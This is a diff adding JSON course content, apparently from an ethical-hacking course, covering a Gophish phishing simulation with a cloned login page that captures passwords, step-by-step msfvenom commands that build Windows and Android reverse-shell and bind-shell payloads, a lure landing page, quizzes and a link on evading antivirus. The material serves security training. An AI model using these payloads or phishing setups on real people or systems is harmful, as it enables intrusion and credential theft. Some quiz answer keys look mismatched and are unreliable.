+                "Configure **Email template** based on policy details",
+                "Import all users from the [employees.csv](https://video.udacity-data.com/topher/2021/January/60086801_employees/employees.csv) file",
+                "Create the **Campaign**"
+              ],
+              "positive_feedback": "Nice work!  You can see my campaign in the next video.",
+              "video_feedback": null,
+              "description": ""
+            }
+          ]
+        },
+        {
+          "id": 1089791,
+          "key": "820a907c-3a03-40cc-93e6-5237af6e1a80",
+          "title": "Solution: Phishing Simulation",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "820a907c-3a03-40cc-93e6-5237af6e1a80",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089787,
+              "key": "5acc1009-d984-48c4-a047-3eb362189ae6",
+              "title": "Solution: Phishing Simulation Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## My Solution",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089788,
+              "key": "88839486-a9cd-4082-9c6f-3af060bbd1ad",
+              "title": "ND350 EHND C1 L4 A07 Solution Phishing Simulation",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "9pG-ygXtDlg",
+                "china_cdn_id": "9pG-ygXtDlg.mp4"
+              }
+            },
+            {
+              "id": 1131447,
+              "key": "dfe90c77-08b9-4912-ba77-20cde59984ed",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "###  1. Configure The Sending Profile\n\n1. Login to Gophish using the provided credentials\n2. Navigate to the **Sending Profile** page and click on the **New Profile **button.\n3. Fill in all fields: \n   * **Name**: `ExampleCorp Sending Profile`\n   * **From**: `Austin Clarke <austin@example.com>.`\n   * **Host**: ` mail.example.com:25`\n   * **Username**:  `phish@example.com`\n   * **Password**: `pass@123`\n4. Click on **Save Profile**\n\n### 2. Create Users and Groups\n1. Navigate to the **Users & Groups** tab and click on **New Group**.\n2. Fill in the **Name** field:  `All Users`.\n3. Use **Bulk Import Users** to import `employees.csv` \n\n### 3. Configure The Landing Page\n1. Navigate to the **Landing Pages** page and click on the **New Page** button.\n2. Give the page a Name: `Bansal X Login`\n3. Click on **Import Site** and import `https://bansalx.com/wp-admin` to copy the HTML code for the landing page.\n\n\n4. Check the **Capture Submitted Data** and the **Capture Passwords** boxes.\n5. In the **Redirect To:**  field enter `https://bansalx.com/wp-admin`\n6. Click on the **Save Page** button.\n\n### 4. Configure The Email Template\n\n1. Navigate to the **Email Templates** page and click on the **New Template** button.\n\n2. Give the template a **Name**: `Email 1`.\n3. Add the  **Subject**:  `You won't believe what he did`.\n4. Add the **Text**:\n>Hey mate,\n>\n>Ben (the accounting guy) just posted a video about our office. He is sharing every one of our secrets and I am sure he will get fired.\n>\n>Sending it to everyone before it is taken down by our IT team\n>Here is the link - {{.URL}}\n>\n>Enjoy!\n>Austin Clarke\n1. Click on **Save template**.\n\n### 5. Set Up A Campaign\n\n1. Navigate to the **Campaigns** page, click on the **New Campaign** button.\n2. Name the campaign:  ExampleCorp Q3 Phishing`. \n3. From  dropdowns select the elements you just created:\n   * **Email template**: `Email 1`\n   * **Landing Page** : `Bansal X Login`\n   * **Sending Profile**: ExampleCorp Sending Profile\n4. In the **URL** box enter the IP address:  `https://10.10.10.7`\n5. Set the **Launch Date** to next Friday at 5PM.\n6. Select `All Users` as the target group for the campaign in the **Groups** dropdown.\n7. Click on the **Launch Campaign** button.\n\n",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089790,
+              "key": "6c627d38-46fd-421b-9e72-ab829bbcc3de",
+              "title": "Thinking Like an Ethical Hacker",
+              "semantic_type": "ValidatedQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "6c627d38-46fd-421b-9e72-ab829bbcc3de",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "What s the best day and time to launch a phishing campaign? Explain your reasoning.",
+                "matchers": [
+                  {
+                    "expression": "[^/s]+"
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089798,
+          "key": "f59d068a-e534-48eb-81f9-931511133ea6",
+          "title": "Malware For Social Engineering",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "f59d068a-e534-48eb-81f9-931511133ea6",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089792,
+              "key": "264dd8f5-a0c8-4694-afc1-a2e17e231348",
+              "title": "Malware For Social Engineering Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Creating Malware For SE",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089793,
+              "key": "0adf8d78-d597-458d-899c-2a2812ee416d",
+              "title": "ND350 EHND C1 L4 A08 Creating Malware For SE",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "hu8SKvLRLMs",
+                "china_cdn_id": "hu8SKvLRLMs.mp4"
+              }
+            },
+            {
+              "id": 1129548,
+              "key": "5a3ceef8-00ba-475e-9fcf-8a5157894ba5",
+              "title": "Malware For Social Engineering Heading New Terms",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Malware Consists of Two Parts\n\n* **Payload: ** the malicious code responsible for exploiting the target’s device. When a user opens a file,  payload code is executed, infecting the. machine.\n* **Handler: **a  command and control center that issues the commands for the payload to execute on the target machine.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1122568,
+              "key": "75fc254a-0781-4de5-8cc5-9c18fd473bd5",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2020/December/5fe890c7_7/7.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/75fc254a-0781-4de5-8cc5-9c18fd473bd5",
+              "caption": "Anatomy Of Malware",
+              "alt": "Malware requires both a payload and a handler",
+              "width": 1002,
+              "height": 437,
+              "instructor_notes": null
+            },
+            {
+              "id": 1122569,
+              "key": "e73b3aa2-f1db-4931-882d-fa73dee06197",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Establishing a Connection Between the Target and Attacker\n\nThere are two types of connections:\n\n* **Bind connection** \n   * The payload starts a listener on the target’s machine which opens a port. \n   * The attacker connects to the newly opened port and issues commands using the handler. \n   * Bind connections are useful when the firewall allows **inbound connections.**\n* **Reverse connection** \n   * The exploit code  initiates a connection back to the attacker’s machine\n   * A listener on the attacker's machine is running and waiting for any connection that comes in. \n   * Reverse connections are useful when the firewall allows **outbound connections**.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1122571,
+              "key": "ac5ab4b6-40d7-4bfd-938d-469d29743f14",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2020/December/5fe89217_8/8.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/ac5ab4b6-40d7-4bfd-938d-469d29743f14",
+              "caption": "Bind V/s Reverse Connection",
+              "alt": "Use a bind connection When inbound connections are allowed in firewall and use a reverse connection when outbound connections are allowed in a firewall",
+              "width": 800,
+              "height": 445,
+              "instructor_notes": null
+            },
+            {
+              "id": 1129550,
+              "key": "3a6ee428-b052-4425-ba0e-fad37956b4be",
+              "title": "Malware For Social Engineering Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Creating Malware Using Metasploit-Framework\n\n1. Open a terminal window and **launch the Metasploit framework**\n```bash\nmsfconsole\n```\n1. Load the **Handler** module\n```bash\nuse exploit/multi/handler\n```\n1. Issue the `show payloads` command to see the list of available payloads\n```bash\nshow payloads\n```\n\n1. Set the desired payload using `set payload (payloadhere)` \n```bash\nset payload windows/shell_bind_tcp\n```\n\n1. Check the options using `show options`  \n```bash\nshow options\n```\n\n1. Utilize the **set** command to set options\n```bash\nset lport 123\nset rhost 10.10.10.20\n```\n1. Create the **payload file** using `msfvenom -p (payloadhere) (optionshere) -f (formathere)`\n```bash\nmsfvenom -p windows/shell_bind_tcp lport=123 -f exe > ~/Desktop/evil.exe\n```\nYou can check available formats using \n```bash\nmsfvenom --list formats.\n```\n1. Start the handler using `run`\n```bash\nrun\n```\n",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1127835,
+              "key": "4f71a9a9-d048-49ff-be6a-d86400d19851",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms\n\n| Term | Definition |\n|-|-|\n| Bind Connection | A connection where the attacker's machine connects to an open port on the target's machine | \n| Handler | The piece of code that an attacker uses to issue commands to the infected victim machine | \n| Payload | The malicious code that infects a target system | \n| Reverse Connection | A connection where the target's machine connects back to an open port on the attacker's machine |",
+              "instructor_notes": null
+            },
+            {
+              "id": 1089797,
+              "key": "2435ea6f-673e-4248-9825-69bd93fa97d6",
+              "title": "Malware For Social Engineering Further Reading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nPayloads created by Metasploit-Framework may get detected by endpoint protection like antivirus software. This article from Hacking Loops talks about how to get around this issue: <a href=\"https://www.hackingloops.com/venom-shellcode-payload-generator/\" target=\"_blank\">Why Venom Is The Ultimate Payload and Shellcode Generator</a>. It talks about Venom-Framework which uses Metasploit-Framework payloads as a base but is able to evade most of the endpoint protection solutions in the market.",
+              "instructor_notes": ""
+            }
+          ]
+        },
+        {
+          "id": 1089802,
+          "key": "55ddf082-4e7c-4448-a1c9-f782f5eeaf01",
+          "title": "Quizzes: Malware For Social Engineering ",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "55ddf082-4e7c-4448-a1c9-f782f5eeaf01",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089799,
+              "key": "aec09adf-6c73-4db8-aa74-d326d0f9f1be",
+              "title": "Malware For Social Engineering Quizzes Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "##  Thinking About Malware For Social Engineering",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089800,
+              "key": "1ab38627-3c16-4b62-a2ac-7ac751735c81",
+              "title": "Malware For Social Engineering Easy Quiz",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "1ab38627-3c16-4b62-a2ac-7ac751735c81",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Which type of malware can you create for social engineering if the target's organization is blocking any inbound connections and only allows users to visit websites on Port 443,?",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "Reverse Shell on TCP",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "Reverse Shell on HTTPS",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1603807927645",
+                    "text": "Bind Shell on UDP",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1603807936421",
+                    "text": "Bind Shell on ICMP",
+                    "is_correct": false
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1091257,
+              "key": "05b529ba-227b-4b04-b6f5-1eaced00110f",
+              "title": "Matching Quiz",
+              "semantic_type": "MatchingQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "05b529ba-227b-4b04-b6f5-1eaced00110f",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "complex_prompt": {
+                  "text": "Match the payload descriptions with their types"
+                },
+                "concepts_label": "Payload Description",
+                "answers_label": "Payload Type",
+                "concepts": [
+                  {
+                    "text": "Operating system independent payload which opens port 123 on our machine",
+                    "correct_answer": {
+                      "id": "a1603808191740",
+                      "text": "`python_reverse_tcp`"
+                    }
+                  },
+                  {
+                    "text": "Operating system independent payload which connects to the victim on a port used by websites",
+                    "correct_answer": {
+                      "id": "a1603808424805",
+                      "text": "`python_bind_https`"
+                    }
+                  },
+                  {
+                    "text": "Windows payload which opens port 123 on the target machine",
+                    "correct_answer": {
+                      "id": "1eb7f04c-0c45-4779-947e-226f9f6e013a",
+                      "text": "`run32dll_bind_udp`"
+                    }
+                  }
+                ],
+                "answers": [
+                  {
+                    "id": "a1603808424805",
+                    "text": "`python_bind_https`"
+                  },
+                  {
+                    "id": "a1603808191740",
+                    "text": "`python_reverse_tcp`"
+                  },
+                  {
+                    "id": "1eb7f04c-0c45-4779-947e-226f9f6e013a",
+                    "text": "`run32dll_bind_udp`"
+                  },
+                  {
+                    "id": "a1603808685108",
+                    "text": "`ruby_bind_udp`"
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089806,
+          "key": "cb373382-a298-4f44-9868-21a0103b1256",
+          "title": "Exercise: Malware For Social Engineering",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "cb373382-a298-4f44-9868-21a0103b1256",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089803,
+              "key": "85d9b58d-4ad0-41f9-80ce-b12d7faa9763",
+              "title": "Exercise: Malware For Social Engineering Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Exercise: Creating a Payload and a Hander",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089804,
+              "key": "ea7b4bd7-18cd-47c4-ba2b-aa7042d29af1",
+              "title": "Exercise: Malware For Social Engineering Instructions",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Your task is to use Metasploit Framework to create two different payload files and configure their handlers for malware attacks.\n\nThere two targets are:\n\n1. **Microsoft Windows** computer with the IP address of `10.10.10.50`.\n1. **Android** device with the IP address of `10.10.10.60`.\n\nAdditionally, there is a firewall running on both devices, which only allows outbound SSH connections.\n\nFollow the steps below to complete the exercise using Metasploit Framework on your Analyst machine.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089805,
+              "key": "7e25a0c3-bdf7-4713-b574-154edcec866c",
+              "title": "Create Malware to Reach a Target Behind a Firewall",
+              "semantic_type": "TaskListAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "7e25a0c3-bdf7-4713-b574-154edcec866c",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "tasks": [
+                "Set up a handler for Windows machine",
+                "Create the windows payload as required by the scenario",
+                "Setup a handler for the Android device",
+                "Create the android payload as required by the scenario"
+              ],
+              "positive_feedback": "Great job!  You can see my solution in the next video.",
+              "video_feedback": null,
+              "description": ""
+            }
+          ]
+        },
+        {
+          "id": 1089811,
+          "key": "805f49ab-0046-43ce-9f52-fa89a55e96ef",
+          "title": "Solution: Malware For Social Engineering",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "805f49ab-0046-43ce-9f52-fa89a55e96ef",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089807,
+              "key": "30b12812-a11f-4ab6-a52c-0fb62365861f",
+              "title": "Solution: Malware For Social Engineering Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## My Solution\n\n### Target 1",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089808,
+              "key": "0c567425-753c-4f60-b7e2-56f417c960e3",
+              "title": "ND350 EHND C1 L4 A09a Lets Create Malware Target 1 V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "1xAVr3Wk65I",
+                "china_cdn_id": "1xAVr3Wk65I.mp4"
+              }
+            },
+            {
+              "id": 1128197,
+              "key": "f679e879-98ad-4270-aea7-e0cb8cd80615",
+              "title": "Solution: Malware For Social Engineering Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "###  Malware for a Windows Machine\n\n1. Open a terminal window and **launch the Metasploit framework**\n```bash\nmsfconsole\n```\n1. Load the **Handler** module\n```bash\nuse exploit/multi/handler\n```\n1. Issue the `show payloads` command to see the list of available payloads\n```bash\nshow payloads\n```\n\n1. Set the required payload \n```bash\nset payload windows/shell/reverse_tcp\n```\n\n1. Utilize the** set** command to input the listening host's IP address and the listening port\n```\nset LHOST 0.0.0.0\nset LPORT 22\n```\n1. On a new terminal window or tab and  create the **actual payload file** \n```\nmsfvenom -p windows/shell/reverse_tcp LPORT=22 LHOST=10.10.10.7 -f exe > ~/Desktop/payload1.exe\n```\n",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1129541,
+              "key": "2d15ec89-3f96-4440-a2f4-9b0e321c8184",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Target 2",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1128198,
+              "key": "612c7957-99f8-44d6-8df6-d1f78ba46f79",
+              "title": "ND350 EHND C1 L4 A09b Lets Create Malware Target 2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "CevEktD39dU",
+                "china_cdn_id": "CevEktD39dU.mp4"
+              }
+            },
+            {
+              "id": 1089809,
+              "key": "4873e3de-9418-4a8a-970e-945835e2723c",
+              "title": "Solution: Malware For Social Engineering Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Malware for an  Android Device\n\n\n1. Open a terminal window and **launch the Metasploit framework**\n```bash\nmsfconsole\n```\n1. Load the **Handler** module\n```bash\nuse exploit/multi/handler\n```\n1. Issue the `show payloads` command to see the list of available payloads\n```bash\nshow payloads\n```\n\n1. Set the required payload \n```bash\nset payload android/shell/reverse_tcp\n```\n\n1. Utilize the** set** command to input the listening host's IP address and the listening port\n```\nset LHOST 0.0.0.0\nset LPORT 22\n```\n1. On a new terminal window or tab and  create the **actual payload file** \n```\nmsfvenom -p android/shell/reverse_tcp LPORT=22 LHOST=10.10.10.7 -f raw > ~/Desktop/payload2.apk\n```\n\n",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1129546,
+              "key": "43179493-9b78-454f-8f7b-5b00385dcec8",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### NOTE:\n\nThese payloads are real malware and can cause damage. <span style=\"color: red; font-size: larger\"><strong> Only use this code  on virtual machines! </strong></span>",
+              "instructor_notes": ""
+            }
+          ]
+        },
+        {
+          "id": 1089818,
+          "key": "4d0d2925-dfed-4e11-8f8f-dec457766a15",
+          "title": "Make A Website for SE",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "4d0d2925-dfed-4e11-8f8f-dec457766a15",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": {
+            "files": [
+              {
+                "name": "website_template.zip",
+                "uri": "https://video.udacity-data.com/topher/2021/January/6008a13c_website-template/website-template.zip"
+              }
+            ],
+            "google_plus_link": null,
+            "career_resource_center_link": null,
+            "coaching_appointments_link": null,
+            "office_hours_link": null,
+            "aws_provisioning_link": null
+          },
+          "atoms": [
+            {
+              "id": 1089812,
+              "key": "34597f3d-bfb6-4f2f-88f3-4af08ff7e4ee",
+              "title": "Make A Website for SE Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Creating Websites For Social Engineering Attacks",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089813,
+              "key": "7d46a1f1-bae8-4910-87a5-493fa44917a2",
+              "title": "ND350 EHND C1 L4 A10a Creating Websites V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "oSVP48_aPY8",
+                "china_cdn_id": "oSVP48_aPY8.mp4"
+              }
+            },
+            {
+              "id": 1129456,
+              "key": "e98d7894-e825-46f9-a125-cd040740d2e6",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Creating an Effective Landing Page\n\nAn effective webpage can influence decisions and actions. Creating a persuasive landing page requires a careful selection of words, images, videos, and  other elements.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1089814,
+              "key": "9c93d842-a75a-4f08-9569-32998b450656",
+              "title": "Make A Website for SE Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Elements of An Effective Landing Page\n\n1. **Bold Heading - **Should never go more than 7-8 words, grab attention, and is clear.\n1. **Sub Heading - **Talk about results or the benefit.\n1. **Video -** Show yourself and create trust.\n1. **Images - **Convey your main idea clearly and reinforces the same idea three times with slight changes.\n1. **Text - **Keep it short, give them 5 to 6 reasons, and increase their confidence.\n1. **Social Proof - **Help them overcome their fears by showing what other people feel or have felt.\n1. **Call to Action - **ask them to take some action like create an account, download and run something, or simply call you.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1128213,
+              "key": "ac63c114-4875-48c5-8c11-fedaa6c8c81e",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Working With A Base Template",
+              "instructor_notes": null
+            },
+            {
+              "id": 1128211,
+              "key": "5faf09b1-7ffa-40c7-bd64-35ff6de3a6e9",
+              "title": "ND350 EHND C1 L4 A10b Using A Base Template",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "Wf6nRHOIP3U",
+                "china_cdn_id": "Wf6nRHOIP3U.mp4"
+              }
+            },
+            {
+              "id": 1128212,
+              "key": "5bf987b5-960b-4611-9a30-840a7df77202",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Edit the Website Template\n\n- Download  and extract the contents of the <a href=\"https://video.udacity-data.com/topher/2021/January/6008a13c_website-template/website-template.zip\" target=\"_blank\">website template</a>\n\n- Edit  `index.html`\n\n   1. **Site title:** :<br>Change\n```\n<title>Simple web page</title>\n```\nto\n```\n<title>Your website Title</title>\n```\n\n   2. **Heading**  and  **Subheading**: <br>These already match my finished site, but you can change the text inside the HTML tags to update it if you'd like:\n```\n      <h1 style=\"color: white;\">The Super <u>SECRET METHOD</u> To Hacking Anyone</h1>\n      <h2 style=\"color: white;\">(How I Hacked <u>Three Thousand People Last Year</u>)</h2>\n```\n\n   4. **Video:**<br>Change `videoidhere` to the video ID number in your YouTube video url\n```\n src=\"https://www.youtube.com/embed/vidoeidhere\"\n```\nto\n```\n src=\"https://www.youtube.com/embed/IF_Z8kVZW3s\"\n```\n\n  5.  **Text**, **Testimontials** and **Call to action**<br>Replace the text inside the HTML tags as needed\n<br><br>\n  6.  **Images**\n    -  Add new images to the `images` folder\n    -  Update the image filenames in the `<img>` HTML tags to match the new file names\n    ``` HTML\n    <img src=\"images/img1.jpg\" alt=\"not found\" />\n    ```\n\n### Updated Code\n```\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>Your Webpage Title</title>\n    <link rel=\"stylesheet\" href=\"style.css\" />\n  </head>\n  <body>\n    <!--Start Header (section one)-->\n    <header>\n      <h1 style=\"color: white;\">The Super <u>SECRET METHOD</u> To Hacking Anyone</h1>\n      <h2 style=\"color: white;\">(How I Hacked <u>Three Thousand People Last Year</u>)</h2>\n      <div class=\"header-video\">\n        <iframe\n          width=\"100%\"\n          height=\"100%\"\n          src=\"https://www.youtube.com/embed/IF_Z8kVZW3s\"\n          frameborder=\"0\"\n          allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\"\n          allowfullscreen\n        ></iframe>\n      </div>\n    </header>\n    <!--End Header (section one)-->\n\n    <!--Start images and text section (Section two)-->\n    <section class=\"images-text\">\n      <div class=\"images\">\n        <div class=\"image\" style=\"pointer-events: none;\"><img src=\"images/img1.jpg\" alt=\"not found\" /></div>\n        <div class=\"image\" style=\"pointer-events: none;\"><img src=\"images/img2.png\" alt=\"not found\" /></div>\n        <div class=\"image\" style=\"pointer-events: none;\"><img src=\"images/img3.png\" alt=\"not found\" /></div>\n      </div>\n      <br><br><br>\n      <div class=\"text\" style=\"color: white;\">\n        <h2>Title for giving reasons why this PDF is important for the employees</u></h2>\n        <div class=\"lists\">\n          <ul>\n            <li>Reason1</li>\n            <li>Reason2</li>\n            <li>Reason3</li>\n          </ul>\n          <ul>\n            <li>Reason4</li>\n            <li>Reason5</li>\n            <li>Reason6</li>\n          </ul>\n        </div>\n      </div>\n    </section>\n    <!--End images and text section (Section two)-->\n    <!--Start testimonial (Section three)-->\n    <div class=\"testimonial\">\n      <div class=\"reviews\">\n        <div class=\"review\">\n          <br><br>\n          <div class=\"image\"><img src=\"images/stars.png\" alt=\"not found\"><br><b style=\"color: yellow;\">5/5</b></div>\n          <p>Review here</p>\n          <h4>Name of person</h4><br>\n          <b>Job Position</b>\n          <br><br>\n        </div>\n        &nbsp;\n        <div class=\"review\">\n          <br><br>\n          <div class=\"image\"><img src=\"images/stars.png\" alt=\"not found\"><b style=\"color: yellow;\">5/5</b></div>\n          <p>Review here</p>\n          <h4>Name of person</h4><br>\n          <b>Job Position</b>\n          <br><br>\n        </div>\n        &nbsp;\n        <div class=\"review\">\n          <br><br>\n          <div class=\"image\"><img src=\"images/stars.png\" alt=\"not found\"><b style=\"color: yellow;\">5/5</b></div>\n          <p>Review here</p>\n          <h4>Name of person</h4><br>\n          <b>Job Position</b>\n          <br><br>\n        </div>\n      </div>\n      <br>\n      <a href=\"report.pdf\"><button> >>> Download Today!<<< </button></a>\n    </div>\n    <!--End testimonial (Section three)-->\n  </body>\n</html>\n```\n\n     \n\n\n## Host the Website\n\nCreate a local server in the terminal. \n\n1. Start a terminal in the folder that contains the `index.html`\n1. Start the server with:\n```bash\npython -m SimpleHTTPServer 80\n```",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1128091,
+              "key": "8afd11b6-f805-478d-968c-45e613aee502",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms \n| Term | Definition |\n|-|-|\n| Call to Action | An element that invites a user to do something like clicking on a button, making a call, or following a link | \n| Page Template | A pre-formatted HTML page that can be used to create a  website quickly | \n| Social Proof | Social Proof is a marketing tactic where a person is influenced to take an action by observing others taking that action.  Examples include reviews, testimonials, and ratings | ",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089817,
+              "key": "88b3c532-1d5b-4ef8-aeb2-1cc779ab9409",
+              "title": "Make A Website for SE Further Reading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nIf you want to learn more about how to create effective landing pages, Check this article from Neil Patel: <a href=\"https://neilpatel.com/blog/landing-page/\" target=\"_blank\">7 Steps to a Perfect Landing Page.</a> It explains how to use social proof, high-quality images, short user forms, and many other best practices with real-life examples.",
+              "instructor_notes": ""
+            }
+          ]
+        },
+        {
+          "id": 1089822,
+          "key": "fb0821c9-16f1-41a0-b22f-5a5319396f40",
+          "title": "Quizzes: Make A Website for SE ",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "fb0821c9-16f1-41a0-b22f-5a5319396f40",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089819,
+              "key": "5a52f79c-1278-4292-b713-300ae9385f1e",
+              "title": "Make A Website for SE Quizzes Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Thinking About Websites for Social Engineering",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1124799,
+              "key": "770004bb-cfda-4e27-9bf9-4151f720fa6d",
+              "title": "",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "770004bb-cfda-4e27-9bf9-4151f720fa6d",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "When we use ***social proof*** in a social engineering website, which of the five opportunities in human psychology are we trying to exploit?",
+                "answers": [
+                  {
+                    "id": "e5aa9625-e554-4eba-8405-8f756040d4e6",
+                    "text": "Greed",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "821e937d-6a7e-4e71-a19c-9091f12a87fd",
+                    "text": "Urgency",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "e33ca8e3-13d2-41c3-8104-ece0e2ff14bc",
+                    "text": "Fear",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "be762aa8-5c86-40e8-9094-7e16c9c59754",
+                    "text": "Curiosity",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "5914923f-4e11-4a39-bb6e-e68bb4839c0e",
+                    "text": "Helpfulness",
+                    "is_correct": false
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1089820,
+              "key": "29775302-53c9-4152-b399-fd1a82ec251e",
+              "title": "Make A Website for SE Hard Quiz",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "29775302-53c9-4152-b399-fd1a82ec251e",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "If you are creating a landing page for employees who know you well,  which video would be more effective to include on the page?",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "A video of you explaining the benefits",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "A video of someone else explaining the benefits",
+                    "is_correct": true
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089826,
+          "key": "d4b59e39-572c-402a-a0be-9e26bd21fb97",
